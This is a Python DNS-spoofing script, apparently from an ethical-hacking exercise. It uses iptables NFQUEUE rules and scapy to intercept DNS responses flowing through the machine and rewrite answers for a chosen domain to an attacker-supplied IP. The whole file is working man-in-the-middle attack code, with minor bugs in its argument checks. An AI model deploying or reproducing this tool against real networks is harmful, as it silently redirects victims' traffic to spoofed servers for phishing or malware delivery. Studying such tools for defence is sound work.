#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import time
import os
import sys
import optparse

#iptables -I FORWARD -j NFQUEUE --queue-num 0
#this is the place where packets are included by default as they flow through the computer

#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#this will capture all the outgoing packets of the current machine

#iptables -I INPUT -j NFQUEUE --queue-num 0
#this will capture all the incoming packets of the current machine

#iptables --flush
#clear out IP tables

#DNSQR - DNS Question Record
#DNSRR - DNS Resource Record

def get_arguments():
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL to Spoof")
    parser.add_option("-s", "--spoof", dest="spoof", help="Spoofed IP")
    (options, arguments) = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify the URL you want to spoof. Use --help for more info.")
        if not options.spoof:
            parser.error("[-] Please specify the IP of your spoofed server. Use --help for more info.")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.url in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.spoof)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
        #print(scapy_packet.show())
    packet.accept()

options = get_arguments()


try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C .......... Flushing IP Tables .......... Please wait. \n")
    os.system("iptables --flush")